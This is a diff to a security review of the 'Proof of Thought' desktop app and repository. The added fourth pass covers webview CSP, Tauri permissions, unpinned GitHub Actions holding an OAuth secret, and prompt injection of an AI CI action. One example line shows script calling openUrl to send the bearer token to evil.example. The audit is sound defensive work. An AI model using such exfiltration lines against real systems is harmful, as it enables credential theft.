@@ -1,10 +1,10 @@
 # Proof of Thought — repository security review
 
-**Date:** 2026-09-05 (third pass, same day)
+**Date:** 2026-09-05 (fourth pass, same day)
 **Reviewed commit:** `f9218a707c1f7111aa003d5f849738c9f2403598` (`Complete connected reviewer setup (#71)`)
 **Scope:** the full tree as shipped: `thoughtd`, MCP, store, schema/markdown, Tauri window, native provider chat, GitHub workflows, and the documented relay/share design. `app/src-tauri` and `prototypes/` are outside the Cargo workspace; they were still reviewed as attack surface.
 
-This is a read-only review. No production code was changed. A third pass treated the daemon, shim, CRDT, store, and window as a hostile local attacker would: mutex poison, SQLite `LIMIT` wrapping, host-global loopback, trash/FTS, WebSocket lag, and confused-deputy HTTP (redirects as well as proxies).
+This is a read-only review. No production code was changed. A fourth pass focused on remaining cyber channels: webview CSP/IPC confused deputies, GitHub Actions secret exposure, discovery URL parsing, markdown HTML/image drop, and whether reviewer secrets ever enter JavaScript.
 
 ---
 
@@ -32,6 +32,8 @@ The important problems are elsewhere:
 Relay sharing (`thought://join/<doc_id>#<secret>`) is **specified, not implemented**. Several of the worst “wrong participant” failures are therefore still latent — but the live `/sync` codec is already missing the `share_id` field the spec depends on.
 
 The third pass still found **no unauthenticated remote RCE**. It did find ways a **weaker principal already on the box** (another OS user, a configured reviewer, or a bearer-holding `/sync` peer) can brick every document, search trash, or desync the window — and it confirmed that discovery’s hardened ureq agent is **not** what `thought-mcp-stdio` uses.
+
+The fourth pass still found **no new critical**. It did find that webview CSP `connect-src` is “any loopback port,” that `opener:default` is a local-path gadget as well as a URL gadget, and that the ungated `@claude` workflow combines a **repo secret** with **unpinned Actions**. Reviewer secrets still never enter the create/reset HTTP JSON (the shim reads them from disk). Discovery `loopback_base` is strict.
 
 ---
 
@@ -272,14 +274,17 @@ Mitigations already present: no token in URLs; no Vite `/__thought/connection` e
 Gaps:
 
 - `withGlobalTauri: true` (`app/src-tauri/tauri.conf.json`) exposes IPC on `window`.
-- CSP is `default-src 'self'; connect-src 'self' http://127.0.0.1:* ws://127.0.0.1:*; style-src 'self' 'unsafe-inline'; img-src 'self' data:` — no `base-uri`, `object-src`, `frame-ancestors`. Fetch-exfil to the public internet is blocked, **but** `opener:default` lets script call `openUrl('https://evil.example/?t=' + token)` and walk the bearer off-box.
+- CSP is `default-src 'self'; connect-src 'self' http://127.0.0.1:* ws://127.0.0.1:*; style-src 'self' 'unsafe-inline'; img-src 'self' data:` — no `base-uri`, `object-src`, `frame-ancestors`. Fetch-exfil to the **public** internet is blocked. `connect-src http://127.0.0.1:*` still lets script talk to **any** loopback HTTP/WebSocket port (other local apps, debug servers), not only `thoughtd`’s ephemeral port. The daemon port is dynamic, so a tight allowlist is awkward — that is the trade.
+- `opener:default` lets script call `openUrl('https://evil.example/?t=' + token)` and walk the bearer off-box. The same permission set typically also allows opening **local paths**, so XSS is an OS-handler gadget, not only a URL gadget (H4).
 - DEV builds assign `window.__thought = { editor, doc, provider }`.
+
+Create/reset reviewer **does not** put the 256-bit secret in the HTTP JSON (good). XSS with the platform bearer is already workspace superuser; it does not need a reviewer token.
 
 **Fix direction**
 
 - Disable `withGlobalTauri` unless something still needs it.
-- Tighten CSP (`base-uri 'none'`, `object-src 'none'`, `frame-ancestors 'none'`).
-- Allowlist `openUrl` schemes (same as H4); this also kills the CSP bypass.
+- Tighten CSP (`base-uri 'none'`, `object-src 'none'`, `frame-ancestors 'none'`). Prefer connecting the window through native code so `connect-src` need not be `127.0.0.1:*`.
+- Allowlist `openUrl` schemes (same as H4); replace `opener:default` with `allow-open-url` + an https allowlist. This also kills the CSP bypass.
 - Longer term: keep the bearer in Rust and proxy `/sync` from native code so the webview never sees it.
 
 ---
@@ -521,18 +526,24 @@ When implemented, missing pieces that would immediately become High:
 
 ---
 
-### M10. GitHub `claude.yml` is not association-gated
+### M10. GitHub `claude.yml` is not association-gated and pins neither the Action nor checkout
 
-**Severity:** Medium (CI / token abuse)
-**Status:** Contrast with `claude-code-review.yml`
+**Severity:** Medium for a private repo; **High on a public repo** (secret + untrusted commenter)
+**Status:** Contrast with `claude-code-review.yml` and with `release.yml` (hash-pinned)
 
 `claude-code-review.yml` runs only for `OWNER` | `MEMBER` | `COLLABORATOR` and uses `--permission-mode bypassPermissions`.
 
-`.github/workflows/claude.yml` runs on **any** `@claude` issue comment, including first-time contributors, with `CLAUDE_CODE_OAUTH_TOKEN`, `contents: read`, `pull-requests: read`, `issues: read`, `id-token: write`. It is not `pull_request_target` (good). Default `actions/checkout` on `issue_comment` is the default branch, not the fork HEAD (mitigates RCE). The OAuth token can still be exercised by whoever can comment `@claude`.
+`.github/workflows/claude.yml` runs on **any** `@claude` issue comment, including first-time contributors, with `secrets.CLAUDE_CODE_OAUTH_TOKEN`, `contents: read`, `pull-requests: read`, `issues: read`, `id-token: write`. It is not `pull_request_target` (good). Default `actions/checkout` on `issue_comment` is the default branch, not the fork HEAD (mitigates unsandboxed RCE from PR code).
+
+The remaining cyber issues are:
+
+1. **Anyone who can comment** spends the OAuth grant and can prompt-inject the Action (issue body/comment is attacker-controlled).
+2. **`uses: anthropics/claude-code-action@v1` and `actions/checkout@v4` are floating tags.** `release.yml` already pins by commit SHA. A moved `@v1` tag on a workflow that injects `CLAUDE_CODE_OAUTH_TOKEN` is credential theft, not just CI breakage.
+3. `id-token: write` mints an OIDC token for that job.
 
 Release workflow is strong: default `contents: read`, `persist-credentials: false`, tag⊆main, signing all-or-nothing, notarization key in `$RUNNER_TEMP` mode 600.
 
-**Fix direction:** add the same `author_association` guard to `claude.yml`; drop `bypassPermissions` on review if inline comments are the only needed tool.
+**Fix direction:** same `author_association` guard as the review workflow; pin Actions by SHA; drop `bypassPermissions` on review if inline comments are the only needed tool; treat issue text as untrusted in the Claude prompt.
 
 ---
 
@@ -685,6 +696,19 @@ Auth is bearer, but the TCP listener accepts everyone on the machine. There is n
 
 ---
 
+### M19. CSP `connect-src http://127.0.0.1:*` + `core:webview:allow-create-webview-window`
+
+**Severity:** Medium (XSS confused deputy / window minting). Folded into H5 if XSS exists.
+**Status:** Hardening gap
+
+The window must reach a **random** daemon port, so CSP cannot name one origin. The chosen wildcard also lets script `fetch`/`WebSocket` any other loopback service on the machine (language servers, other desktop apps, debug UIs). That is independent of the thought bearer.
+
+`capabilities/default.json` grants `core:webview:allow-create-webview-window` in addition to the custom `new_window` command (which validates `doc_id`). With `withGlobalTauri: true`, XSS can try the generic Tauri window API. Remote URLs in a Tauri webview do **not** get IPC by default (no `dangerousRemoteDomainIpcAccess` in this repo — good). The residual is extra native windows / chrome spoofing, not automatic bearer theft.
+
+**Fix direction:** proxy daemon HTTP from Rust and drop `127.0.0.1:*` from CSP; keep window creation on the validated `new_window` command only.
+
+---
+
 ### L1. Non-constant-time platform-bearer compare
 
 `value == expected` in MCP and `/sync` middleware. 256-bit secret over loopback: practical timing extraction is unrealistic. Reviewer auth hashes then looks up — better.
@@ -741,6 +765,18 @@ Explanations are capped at 16 KiB and rendered with `textContent` (no DOM XSS). 
 
 ---
 
+### L9. JS `TextDecoder` is lossy; Rust `from_utf8` is strict
+
+`app/src/protocol.ts` `decode` uses `new TextDecoder().decode` (replacement characters) for `doc_id`. `Frame::decode` in Rust requires UTF-8. A non-UTF-8 id is dropped on the daemon and misread in the window. Not a bypass; a desync footgun if a future peer is hostile.
+
+---
+
+### L10. Product CI is tag-pinned; release is SHA-pinned
+
+`ci.yml` uses `actions/checkout@v5`, `actions/setup-node@v4`, `Swatinem/rust-cache@v2`. Those jobs have no high-value secrets. `release.yml` pins by commit SHA. Align CI with release when convenient; **do** pin `claude.yml` (M10).
+
+---
+
 ## 4. What is solid (do not regress)
 
 These controls were checked and should be treated as invariants:
@@ -776,6 +812,14 @@ These controls were checked and should be treated as invariants:
 | `list_tools` hides write tools from reviewers | `Thought::list_tools` |
 | Workspace observer runs **outside** the document mutex | `Workspace::with` |
 | Create-reviewer HTTP JSON omits the secret | `connections.rs` serialization test |
+| `loopback_base` requires exact `http://127.0.0.1:<1..=65535>/mcp` (no userinfo, path, or IPv6) | `discovery.rs` |
+| Reviewer create/reset never return the secret to JS; shim reads `{id}.token` | `editor_api.rs`, `thought-mcp-stdio` |
+| `credential_hash` UNIQUE 32-byte blob | `thought-store` schema |
+| Markdown drops images and raw HTML except the exact font-size span | `thought-markdown` parse |
+| Font-size values are `Npx` in 8..=96 only | `normalize_font_size` |
+| No `dangerousRemoteDomainIpcAccess` | `tauri.conf.json` |
+| Suggestion / chat / switcher titles use `textContent` | `suggestions.ts`, `pro-chat.ts`, `main.ts` |
+| Setup command shell-quotes the executable; connection id is `[a-z0-9-]{1,64}` | `reviewer-setup.ts` |
 
 ---
 
@@ -809,7 +853,7 @@ Do not describe the future relay as private. Do not add an “encrypted” flag 
 4. Allowlist link schemes at parse, schema, and `openUrl` — **H4**.
 5. `chmod 0700` `THOUGHT_HOME` and `0600` the DB/WAL/logs — **H6**.
 6. Cap `/sync` frames; do not create channels for unknown docs; cap XML depth; reject `Update` without Subscribe — **M3 / M12 / M18 / H3**.
-7. Gate `claude.yml` the same way as the review workflow — **M10**.
+7. Gate `claude.yml` the same way as the review workflow; **pin the Action and checkout by SHA** — **M10**.
 8. Add a transport test: reviewer `replace_block` is denied — **M8**.
 9. Re-validate suggestion patch nodes on accept; ignore `suggestions` keys on generic `Update` — **H3**.
 10. Stop treating trash as hidden from reviewers; drop or filter FTS for tombstones — **M14**.
@@ -832,6 +876,7 @@ Do not describe the future relay as private. Do not add an “encrypted” flag 
 21. `proxy(None)` on provider chat unless a proxy is an explicit product choice — **H7**.
 22. Stop panicking under the workspace mutex (`into_inner` / `parking_lot`, fallible JSON) — **M16**.
 23. Cap concurrent loopback connections and WS message size — **M18**.
+24. Drop `127.0.0.1:*` from CSP once the window talks through native code; keep window creation on `new_window` only — **M19**.
 
 ---
 
@@ -851,7 +896,9 @@ Exploratory agents mapped surfaces; every High/Medium finding was re-read in sou
 
 The second pass re-checked: ureq proxy defaults vs `discovery::local_agent`, stdio shim request construction, WebSocket vs CORS, suggestion accept vs schema, Yjs `read_children` recursion, awareness fanout, provider TLS/redirects/attachment magic bytes, Tauri opener/CSP, and CI association gates.
 
-The third pass re-checked, as an on-box attacker: `Workspace::with` mutex poison and `expect` under the lock; SQLite `LIMIT ? as i64` wrapping; FTS vs `deleted_at`; reviewer scope after trash; `/sync` Update without Subscribe; `diff_since` on a malformed state vector; broadcast `Lagged`; shim `ureq::post` vs `local_agent()` (proxy **and** redirects); host-global `127.0.0.1` vs file modes; empty `find`; suggestion map key vs `connection_id`. Ordinary unit tests were not re-run; this review did not change runtime code.
+The third pass re-checked, as an on-box attacker: `Workspace::with` mutex poison and `expect` under the lock; SQLite `LIMIT ? as i64` wrapping; FTS vs `deleted_at`; reviewer scope after trash; `/sync` Update without Subscribe; `diff_since` on a malformed state vector; broadcast `Lagged`; shim `ureq::post` vs `local_agent()` (proxy **and** redirects); host-global `127.0.0.1` vs file modes; empty `find`; suggestion map key vs `connection_id`.
+
+The fourth pass re-checked remaining cyber channels: CSP `connect-src` and `opener:default`; Tauri `allow-create-webview-window` vs `new_window`; whether create/reset reviewer JSON ever includes the secret; `loopback_base` (no userinfo/path); markdown image/HTML drop and exact font-size span; `credential_hash` UNIQUE; GitHub `claude.yml` unpinned tags + OAuth secret vs hash-pinned `release.yml`; JS vs Rust frame UTF-8. Ordinary unit tests were not re-run; this review did not change runtime code.
 
 ---
 
